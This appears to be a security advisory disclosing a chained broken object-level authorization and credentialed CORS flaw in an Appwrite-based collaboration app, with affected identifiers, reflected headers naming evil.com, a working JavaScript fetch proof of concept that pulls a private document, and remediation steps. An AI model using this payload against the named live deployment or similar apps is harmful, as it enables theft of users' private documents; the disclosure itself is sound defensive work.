# Chained Broken Object Level Authorization (BOLA) + CORS Misconfiguration in AppWrite Collab App

**Broken Object Level Authorization (BOLA) combined with credentialed CORS misconfiguration enables cross-user, cross-origin authenticated document exfiltration.**

**GHSA-3m6r-g5gh-wq6c** <br/>

Official Advisory:
[https://github.com/karnop/realtime-collaboration-platform/security/advisories/GHSA-3m6r-g5gh-wq6c](https://github.com/karnop/realtime-collaboration-platform/security/advisories/GHSA-3m6r-g5gh-wq6c)

![a-cinematic-cyberpunk-gothic-illustratio_YjclSHY8TfiL359Zix-Mhg_340-D-g3Sty_t5KFlyHlkg_sd](https://github.com/user-attachments/assets/61ad2567-83b2-4b12-b6f9-cbb074947182) <br/>

---

## Summary

A critical vulnerability exists in:

`https://realtime-collaboration-platform-steel.vercel.app/`

This issue results from chaining:

* Broken Object Level Authorization (BOLA / IDOR)
* CORS misconfiguration allowing arbitrary origins with credentials

When combined, these flaws enable authenticated cross-origin document exfiltration.

---

## Affected Components

* Application: realtime-collaboration-platform-steel.vercel.app
* Appwrite Project ID: 6981d34b0036b9515a07
* Database ID: 6981d87b002e1c8dbc0d
* Collection: documents
* Affected Versions: All versions (main branch)
* Patched Versions: None

---

# Vulnerability 1 — Broken Object Level Authorization

Documents include explicit user-level permissions:

```json
"$permissions": [
  "read(\"user:6998155500257546eebd\")",
  "update(\"user:6998155500257546eebd\")",
  "delete(\"user:6998155500257546eebd\")"
]
```

Despite this:

* Another authenticated user retrieved the document
* Full JSON response returned
* No ownership validation was enforced

This confirms object-level authorization bypass.

---

# Vulnerability 2 — CORS Misconfiguration

The server reflects arbitrary Origin headers and allows credentials:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

This allows:

* Authenticated cross-origin requests
* Reading sensitive responses
* Malicious domains extracting protected data

---

# 🔥 Proof of Concept (PoC)

## Attack Setup

1. User A creates a private document.
2. User B logs into the platform.
3. User B visits attacker-controlled webpage.

## Exploit Code

```html
<script>
fetch("https://cloud.appwrite.io/v1/databases/6981d87b002e1c8dbc0d/collections/documents/documents/69981f2500182f323cd2", {
  credentials: "include",
  headers: {
    "X-Appwrite-Project": "6981d34b0036b9515a07",
    "X-Appwrite-Response-Format": "1.8.0"
  }
})
.then(r => r.json())
.then(data => {
  document.body.innerHTML = "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
});
</script>
```

<img width="1914" height="1026" alt="CORS_IDOR" src="https://github.com/user-attachments/assets/af7377ee-af06-41e8-9abb-cb274a99d6d2" /> <br/>


## Result

* Victim browser sends authenticated request
* Server permits cross-origin response
* Private document JSON exposed
* Cross-user, cross-origin exfiltration achieved

---

# Impact

* Unauthorized document access
* Cross-origin authenticated data theft
* Victim used as exfiltration proxy
* Scalable remote harvesting attack

Severity: **High**

---

# Remediation

* Enforce strict server-side ownership validation
* Restrict CORS to trusted origins only
* Disable origin reflection
* Avoid credentialed cross-origin requests unless required

---

# ⭐ Follow Me & Connect

🔗 GitHub: [https://github.com/AdityaBhatt3010](https://github.com/AdityaBhatt3010) <br/>
💼 LinkedIn: [https://www.linkedin.com/in/adityabhatt3010/](https://www.linkedin.com/in/adityabhatt3010/) <br/>
✍️ Medium: [https://medium.com/@adityabhatt3010](https://medium.com/@adityabhatt3010) <br/>

---
